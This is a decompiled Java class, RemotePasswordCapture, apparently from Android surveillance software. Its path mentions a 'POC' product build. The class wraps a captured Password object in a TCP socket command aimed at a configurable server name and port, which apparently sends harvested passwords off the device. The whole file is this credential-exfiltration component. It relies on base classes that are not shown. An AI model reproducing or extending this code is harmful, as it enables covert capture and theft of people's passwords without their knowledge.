package com.vvt.capture.core.password.ref.command;

import com.fx.socket.TcpSocketCmd;
import com.vvt.capture.core.password.Password;

public class RemotePasswordCapture
  extends TcpSocketCmd
{
  private static String a;
  private static int b = 0;
  private static final long serialVersionUID = -4924766994872831800L;
  
  public RemotePasswordCapture(Password paramPassword, String paramString, int paramInt)
  {
    super(paramPassword, Boolean.class);
    a = paramString;
    b = paramInt;
  }
  
  protected int getPort()
  {
    return b;
  }
  
  protected String getServerName()
  {
    return a;
  }
  
  protected String getTag()
  {
    return "RemotePasswordCapture";
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/core/password/ref/command/RemotePasswordCapture.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */